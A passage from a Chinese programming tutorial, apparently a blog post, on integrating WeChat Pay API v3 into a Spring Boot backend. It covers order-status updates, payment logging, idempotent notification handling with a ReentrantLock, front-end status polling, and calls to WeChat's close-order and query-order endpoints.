class="code"><pre><span class="line"><span class="keyword">package</span> top.nanzx.learn_wechatpayment.service.impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.core.conditions.query.QueryWrapper;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderInfoServiceImpl</span> <span class="keyword">extends</span> <span class="title class_">ServiceImpl</span>&lt;OrderInfoMapper, OrderInfo&gt; <span class="keyword">implements</span> <span class="title class_">OrderInfoService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> ProductMapper productMapper;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 更新订单状态</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> orderNo</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> orderStatus</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">updateStatusByOrderNo</span><span class="params">(String orderNo, OrderStatus orderStatus)</span> &#123;</span><br><span class="line">        log.info(<span class="string">&quot;更新订单状态 ===&gt; &#123;&#125;&quot;</span>, orderStatus.getType());</span><br><span class="line">        QueryWrapper&lt;OrderInfo&gt; wrapper = <span class="keyword">new</span> <span class="title class_">QueryWrapper</span>&lt;&gt;();</span><br><span class="line">        wrapper.eq(<span class="string">&quot;order_no&quot;</span>, orderNo);</span><br><span class="line"></span><br><span class="line">        <span class="type">OrderInfo</span> <span class="variable">orderInfo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OrderInfo</span>();</span><br><span class="line">        orderInfo.setOrderStatus(orderStatus.getType());</span><br><span class="line">        baseMapper.update(orderInfo, wrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>记录支付日志：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.nanzx.learn_wechatpayment.service.impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.extension.service.impl.ServiceImpl;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PaymentInfoServiceImpl</span> <span class="keyword">extends</span> <span class="title class_">ServiceImpl</span>&lt;PaymentInfoMapper, PaymentInfo&gt; <span class="keyword">implements</span> <span class="title class_">PaymentInfoService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 记录支付日志</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> plainText</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">createPaymentInfo</span><span class="params">(String plainText)</span> &#123;</span><br><span class="line">        log.info(<span class="string">&quot;记录支付日志&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Gson</span> <span class="variable">gson</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Gson</span>();</span><br><span class="line">        Map&lt;String, Object&gt; plainTextMap = gson.fromJson(plainText, HashMap.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">orderNo</span> <span class="operator">=</span> (String) plainTextMap.get(<span class="string">&quot;out_trade_no&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">transactionId</span> <span class="operator">=</span> (String) plainTextMap.get(<span class="string">&quot;transaction_id&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">tradeType</span> <span class="operator">=</span> (String) plainTextMap.get(<span class="string">&quot;trade_type&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">tradeState</span> <span class="operator">=</span> (String) plainTextMap.get(<span class="string">&quot;trade_state&quot;</span>);</span><br><span class="line">        Map&lt;String, Object&gt; amount = (Map) plainTextMap.get(<span class="string">&quot;amount&quot;</span>);</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">payerTotal</span> <span class="operator">=</span> ((Double) amount.get(<span class="string">&quot;payer_total&quot;</span>)).intValue();</span><br><span class="line"></span><br><span class="line">        <span class="type">PaymentInfo</span> <span class="variable">paymentInfo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PaymentInfo</span>();</span><br><span class="line">        paymentInfo.setOrderNo(orderNo);</span><br><span class="line">        paymentInfo.setPaymentType(PayType.WXPAY.getType());</span><br><span class="line">        paymentInfo.setTransactionId(transactionId);</span><br><span class="line">        paymentInfo.setTradeType(tradeType);</span><br><span class="line">        paymentInfo.setTradeState(tradeState);</span><br><span class="line">        paymentInfo.setPayerTotal(payerTotal);</span><br><span class="line">        paymentInfo.setContent(plainText);</span><br><span class="line">        baseMapper.insert(paymentInfo);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="接口幂等性"><a href="#接口幂等性" class="headerlink" title="接口幂等性"></a>接口幂等性</h3><p>微信支付通过支付通知接口将用户支付成功消息通知给商户</p><p>注意：同样的通知可能会多次发送给商户系统。商户系统必须能够正确处理重复的通知。 推荐的做法是，当商户系统收到通知进行处理时，先检查对应业务数据的状态，并判断该通知是否已经处理。如果未处理，则再进行处理；如果已处理，则直接返回结果成功。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processOrder</span><span class="params">(Map&lt;String, Object&gt; bodyMap)</span> <span class="keyword">throws</span> GeneralSecurityException &#123;</span><br><span class="line">    log.info(<span class="string">&quot;处理订单&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">plainText</span> <span class="operator">=</span> decryptFromResource(bodyMap);</span><br><span class="line">    <span class="comment">// 转换明文</span></span><br><span class="line">    <span class="type">Gson</span> <span class="variable">gson</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Gson</span>();</span><br><span class="line">    Map&lt;String, Object&gt; plainTextMap = gson.fromJson(plainText, HashMap.class);</span><br><span class="line">    <span class="comment">// 获取商户订单号</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">orderNo</span> <span class="operator">=</span> (String) plainTextMap.get(<span class="string">&quot;out_trade_no&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//处理重复通知，保证接口调用的幂等性：无论接口被调用多少次，产生的结果是一致的</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">orderStatus</span> <span class="operator">=</span> orderInfoService.getOrderStatus(orderNo);</span><br><span class="line">    <span class="keyword">if</span> (!OrderStatus.NOTPAY.getType().equals(orderStatus)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 更新订单状态</span></span><br><span class="line">    orderInfoService.updateStatusByOrderNo(orderNo, OrderStatus.SUCCESS);</span><br><span class="line">    <span class="comment">// 记录支付日志</span></span><br><span class="line">    paymentInfoService.createPaymentInfo(plainText);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 根据订单号获取订单状态</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> orderNo</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getOrderStatus</span><span class="params">(String orderNo)</span> &#123;</span><br><span class="line">    QueryWrapper&lt;OrderInfo&gt; queryWrapper = <span class="keyword">new</span> <span class="title class_">QueryWrapper</span>&lt;&gt;();</span><br><span class="line">    queryWrapper.eq(<span class="string">&quot;order_no&quot;</span>, orderNo);</span><br><span class="line">    <span class="type">OrderInfo</span> <span class="variable">orderInfo</span> <span class="operator">=</span> baseMapper.selectOne(queryWrapper);</span><br><span class="line">    <span class="comment">//防止被删除的订单的回调通知的调用</span></span><br><span class="line">    <span class="keyword">if</span> (orderInfo == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> orderInfo.getOrderStatus();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="数据锁"><a href="#数据锁" class="headerlink" title="数据锁"></a>数据锁</h3><p>在对业务数据进行状态检查和处理之前，要采用数据锁进行并发控制，以避免函数重入造成的数据混乱。</p><p>定义 ReentrantLock 进行并发控制。注意，必须手动释放锁。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.nanzx.learn_wechatpayment.service.impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.google.gson.Gson;</span><br><span class="line">...</span><br><span class="line">    </span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WxPayServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">WxPayService</span> &#123;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">ReentrantLock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantLock</span>();</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">        </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processOrder</span><span class="params">(Map&lt;String, Object&gt; bodyMap)</span> <span class="keyword">throws</span> GeneralSecurityException &#123;</span><br><span class="line">        log.info(<span class="string">&quot;处理订单&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">plainText</span> <span class="operator">=</span> decryptFromResource(bodyMap);</span><br><span class="line">        <span class="comment">// 转换明文</span></span><br><span class="line">        <span class="type">Gson</span> <span class="variable">gson</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Gson</span>();</span><br><span class="line">        Map&lt;String, Object&gt; plainTextMap = gson.fromJson(plainText, HashMap.class);</span><br><span class="line">        <span class="comment">// 获取商户订单号</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">orderNo</span> <span class="operator">=</span> (String) plainTextMap.get(<span class="string">&quot;out_trade_no&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 尝试获取锁：</span></span><br><span class="line">        <span class="comment">// 成功获取则立即返回true，获取失败则立即返回false。不必一直等待锁的释放</span></span><br><span class="line">         <span class="keyword">if</span>(lock.tryLock()) &#123;</span><br><span class="line">             <span class="keyword">try</span> &#123;</span><br><span class="line">                 <span class="comment">//处理重复通知，保证接口调用的幂等性：无论接口被调用多少次，产生的结果是一致的</span></span><br><span class="line">                 <span class="type">String</span> <span class="variable">orderStatus</span> <span class="operator">=</span> orderInfoService.getOrderStatus(orderNo);</span><br><span class="line">                 <span class="keyword">if</span> (!OrderStatus.NOTPAY.getType().equals(orderStatus)) &#123;</span><br><span class="line">                     <span class="keyword">return</span>;</span><br><span class="line">                 &#125;</span><br><span class="line"></span><br><span class="line">                 <span class="comment">// 更新订单状态</span></span><br><span class="line">                 orderInfoService.updateStatusByOrderNo(orderNo, OrderStatus.SUCCESS);</span><br><span class="line">                 <span class="comment">// 记录支付日志</span></span><br><span class="line">                 paymentInfoService.createPaymentInfo(plainText);</span><br><span class="line">             &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                 lock.unlock();</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="查单接口"><a href="#查单接口" class="headerlink" title="查单接口"></a>查单接口</h3><p><strong>后端定义商户查单接口</strong>（支付成功后，商户侧查询本地数据库，订单是否支付成功）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.nanzx.learn_wechatpayment.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> io.swagger.annotations.Api;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="meta">@Api(tags = &quot;商品订单管理&quot;)</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/api/order-info&quot;)</span></span><br><span class="line"><span class="meta">@CrossOrigin</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderInfoController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> OrderInfoService orderInfoService;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ApiOperation(&quot;查询本地订单状态&quot;)</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/query-order-status/&#123;orderNo&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> R <span class="title function_">queryOrderStatus</span><span class="params">(<span class="meta">@PathVariable</span> String orderNo)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">orderStatus</span> <span class="operator">=</span> orderInfoService.getOrderStatus(orderNo);</span><br><span class="line">        <span class="keyword">if</span> (OrderStatus.SUCCESS.getType().equals(orderStatus)) &#123;<span class="comment">//支付成功</span></span><br><span class="line">            <span class="keyword">return</span> R.ok().setMessage(<span class="string">&quot;支付成功&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> R.ok().setCode(<span class="number">101</span>).setMessage(<span class="string">&quot;支付中...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>前端定时轮询查单</strong>(在二维码展示页面，前端定时轮询查询订单是否已支付，如果支付成功则跳转到订单页面)：</p><ul><li><p>定义定时器</p><ul><li><pre><code class="javascript">//启动定时器 this.timer = setInterval(() =&gt; &#123;     //查询订单是否支付成功     this.queryOrderStatus() &#125;, 3000)<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 查询订单</span><br><span class="line"></span><br><span class="line">  - ```javascript</span><br><span class="line">    // 查询订单状态 </span><br><span class="line">    queryOrderStatus() &#123; </span><br><span class="line">        orderInfoApi.queryOrderStatus(this.orderNo).then(response =&gt; &#123;</span><br><span class="line">            console.log(&#x27;查询订单状态：&#x27; + response.code) </span><br><span class="line">            // 支付成功后的页面跳转 </span><br><span class="line">            if (response.code === 0) &#123; </span><br><span class="line">                console.log(&#x27;清除定时器&#x27;) </span><br><span class="line">                clearInterval(this.timer) </span><br><span class="line">                // 三秒后跳转到订单列表 </span><br><span class="line">                setTimeout(() =&gt; &#123;</span><br><span class="line">                    this.$router.push(&#123; path: &#x27;/success&#x27; &#125;)</span><br><span class="line">                &#125;, 3000)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></code></pre></li></ul></li></ul><h2 id="关闭订单API"><a href="#关闭订单API" class="headerlink" title="关闭订单API"></a>关闭订单API</h2><blockquote><p><a href="https://pay.weixin.qq.com/wiki/doc/apiv3/apis/chapter3_4_3.shtml">https://pay.weixin.qq.com/wiki/doc/apiv3/apis/chapter3_4_3.shtml</a></p></blockquote><p>实现用户主动取消订单的功能:</p><p>WxPayController：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ApiOperation(&quot;用户取消订单&quot;)</span></span><br><span class="line"><span class="meta">@PostMapping(&quot;/cancel/&#123;orderNo&#125;&quot;)</span></span><br><span class="line"><span class="keyword">public</span> R <span class="title function_">cancel</span><span class="params">(<span class="meta">@PathVariable</span> String orderNo)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    log.info(<span class="string">&quot;取消订单&quot;</span>);</span><br><span class="line">    wxPayService.cancelOrder(orderNo);</span><br><span class="line">    <span class="keyword">return</span> R.ok().setMessage(<span class="string">&quot;订单已取消&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>WxPayServiceImpl：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">cancelOrder</span><span class="params">(String orderNo)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//调用微信支付的关单接口</span></span><br><span class="line">        <span class="built_in">this</span>.closeOrder(orderNo);</span><br><span class="line">        <span class="comment">//更新商户端的订单状态</span></span><br><span class="line">        orderInfoService.updateStatusByOrderNo(orderNo, OrderStatus.CANCEL);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">closeOrder</span><span class="params">(String orderNo)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        log.info(<span class="string">&quot;关单接口的调用，订单号 ===&gt; &#123;&#125;&quot;</span>, orderNo);</span><br><span class="line">        <span class="comment">//创建远程请求对象</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> String.format(WxApiType.CLOSE_ORDER_BY_NO.getType(), orderNo);</span><br><span class="line">        url = wxPayConfig.getDomain().concat(url);</span><br><span class="line">        <span class="type">HttpPost</span> <span class="variable">httpPost</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpPost</span>(url);</span><br><span class="line">        <span class="comment">//组装json请求体</span></span><br><span class="line">        <span class="type">Gson</span> <span class="variable">gson</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Gson</span>();</span><br><span class="line">        Map&lt;String, String&gt; paramsMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        paramsMap.put(<span class="string">&quot;mchid&quot;</span>, wxPayConfig.getMchId());</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonParams</span> <span class="operator">=</span> gson.toJson(paramsMap);</span><br><span class="line">        log.info(<span class="string">&quot;请求参数 ===&gt; &#123;&#125;&quot;</span>, jsonParams);</span><br><span class="line"></span><br><span class="line">        <span class="type">StringEntity</span> <span class="variable">entity</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringEntity</span>(jsonParams, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        entity.setContentType(<span class="string">&quot;application/json&quot;</span>);</span><br><span class="line">        httpPost.setEntity(entity);</span><br><span class="line">        httpPost.setHeader(<span class="string">&quot;Accept&quot;</span>, <span class="string">&quot;application/json&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">CloseableHttpResponse</span> <span class="variable">response</span> <span class="operator">=</span> wxPayClient.execute(httpPost);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">statusCode</span> <span class="operator">=</span> response.getStatusLine().getStatusCode();</span><br><span class="line">            <span class="comment">//响应状态码</span></span><br><span class="line">            <span class="keyword">if</span> (statusCode == <span class="number">200</span>) &#123;</span><br><span class="line">                <span class="comment">//处理成功</span></span><br><span class="line">                log.info(<span class="string">&quot;成功200&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (statusCode == <span class="number">204</span>) &#123;</span><br><span class="line">                <span class="comment">//处理成功，无返回Body</span></span><br><span class="line">                log.info(<span class="string">&quot;成功204&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                log.info(<span class="string">&quot;Native下单失败,响应码 = &quot;</span> + statusCode);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;request failed&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            response.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="查询订单API"><a href="#查询订单API" class="headerlink" title="查询订单API"></a>查询订单API</h2><blockquote><p><a href="https://pay.weixin.qq.com/wiki/doc/apiv3/apis/chapter3_4_2.shtml">https://pay.weixin.qq.com/wiki/doc/apiv3/apis/chapter3_4_2.shtml</a></p></blockquote><p>商户后台未收到异步支付结果通知时，商户应该主动调用《微信支付查单接口》，同步订单状态。</p><p>WxPayController：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ApiOperation(&quot;查询订单：测试订单状态用&quot;)</span></span><br><span class="line"><span class="meta">@GetMapping(&quot;query/&#123;orderNo&#125;&quot;)</span></span><br><span class="line"><span class="keyword">public</span> R <span class="title function_">queryOrder</span><span class="params">(<span class="meta">@PathVariable</span> String orderNo)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    log.info(<span class="string">&quot;查询订单&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">bodyAsString</span> <span class="operator">=</span> wxPayService.queryOrder(orderNo);</span><br><span class="line">    <span class="keyword">return</span> R.ok().setMessage(<span class="string">&quot;查询成功&quot;</span>).data(<span class="string">&quot;bodyAsString&quot;</span>, bodyAsString);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>WxPayServiceImpl：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">queryOrder</span><span class="params">(String orderNo)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">       log.info(<span class="string">&quot;查单接口调用 ===&gt; &#123;&#125;&quot;</span>, orderNo);</span><br><span class="line">       <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> String.format(WxApiType.ORDER_QUERY_BY_NO.getType(), orderNo);</span><br><span class="line">       url = wxPayConfig.getDomain().concat(url).concat(<span class="string">&quot;? mchid=&quot;</span>).concat(wxPayConfig.getMchId());</span><br><span class="line">       <span class="type">HttpGet</span> <span class="variable">httpGet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpGet</span>(url);</span><br><span class="line">       httpGet.setHeader(<span class="string">&quot;Accept&quot;</span>, <span class="string">&quot;application/json&quot;</span>);</span><br><span class="line">       <span class="comment">//完成签名并执行请求</span></span><br><span class="line">       <span class="type">CloseableHttpResponse</span> <span class="variable">response</span> <span class="operator">=</span> wxPayClient.execute(httpGet);</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="type">String</span> <span class="variable">bodyAsString</span> <span class="operator">=</span> EntityUtils.toString(response.getEntity());</span><br><span class="line">           <span class="comment">//响应体</span></span><br><span class="line">           <span class="type">int</span> <span class="variable">statusCode</span> <span class="operator">=</span> response.getStatusLine().getStatusCode();</span><br><span class="line">           <span class="comment">//响应状态码</span></span><br><span class="line">           <span class="keyword">if</span> (statusCode == <span class="number">200</span>) &#123;</span><br><span class="line">               <span class="comment">//处理成功 </span></span><br><span class="line">               log.info(<span class="string">&quot;成功, 返回结果 = &quot;</span> + bodyAsString);</span><br><span class="line">           &#125; <span class="keyword">else</span> <span class="keyword">if</span> (statusCode == <span class="number">204</span>) &#123;</span><br><span class="line">               <span class="comment">//处理成功，无返回Body</span></span><br><span 